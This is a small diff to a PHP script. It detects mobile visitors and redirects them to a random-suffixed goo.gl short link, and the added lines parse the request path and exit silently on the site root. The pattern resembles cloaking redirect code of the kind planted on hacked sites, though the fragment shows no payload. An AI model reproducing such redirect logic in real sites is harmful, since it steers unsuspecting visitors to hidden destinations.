@@ -28,6 +28,15 @@
   if($detect->isMobile() || $browser->isMobile()){
     $action = 'mobile';
   }
+  
+  $id = @$_SERVER["REQUEST_URI"];
+  if(empty($id) || $id == "" || $id == "/"){
+    @ob_end_clean();
+    @ob_end_flush();
+    exit();
+  }
+  $id = isset(explode("/", $id)[1]) ? explode("/", $id)[1] : $id;
+  $id = isset(explode(".", $id)[0]) ? explode(".", $id)[0] : $id;
 
   if($action == 'mobile'){
     header('Location: https://goo.gl/091aJP?'.rand(11111,99999));
